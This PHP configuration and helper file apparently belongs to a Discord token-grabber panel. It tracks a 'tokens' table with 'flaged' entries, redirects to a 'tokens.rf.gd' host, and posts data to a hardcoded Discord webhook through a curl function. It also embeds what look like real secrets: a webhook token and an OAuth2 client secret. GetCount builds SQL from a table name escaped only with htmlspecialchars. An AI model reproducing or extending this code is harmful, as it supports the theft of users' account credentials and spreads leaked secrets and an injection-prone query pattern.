<?php
    require_once('database.php');

    // 
    $api_password = "PASSWORD FOR API";
    $webhook = "https://canary.discord.com/api/webhooks/1026102031758409768/nw9ikzm6TTF8uCCS5-y-RlTWGmI0-dx9sG2zsGlmm5ur0P8F91x9QEfQ2kDM8aO_wuoo";

    // For Authentification System (Require)
    $OAUTH2_CLIENT_ID = '1030827555743346719';
    $OAUTH2_CLIENT_SECRET = '6ffeyuyaILt6ao6jC_aPKv4v5hYju2QS';
    $RedirectUrl = 'http://tokens.rf.gd/';
    $WhitelistIds = array("WL FOR YOUR IDS","...", "..");

    function CheckLogin(){
        if(isset($_SESSION['access_token'])) { return true; }
        else { return false; }
    }

    function GetCount($table) {
        global $bdd;
        $req = $bdd->prepare('SELECT * FROM ' . htmlspecialchars($table));
        $req->execute();
        return $req->rowCount();
    }

    function GetFlagedCount() {
        global $bdd;
        $req = $bdd->prepare('SELECT * FROM tokens WHERE isflaged = 1');
        $req->execute();
        return $req->rowCount();
    }

    function SendToWebhook($webhook, $data) {
        $ch = curl_init($webhook);
        curl_setopt_array($ch, array(
            CURLOPT_HTTPHEADER => array(
                "Content-Type: application/json"
            ),
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_RETURNTRANSFER => true
        ));

        curl_exec($ch);
        curl_close($ch);
    }
?>
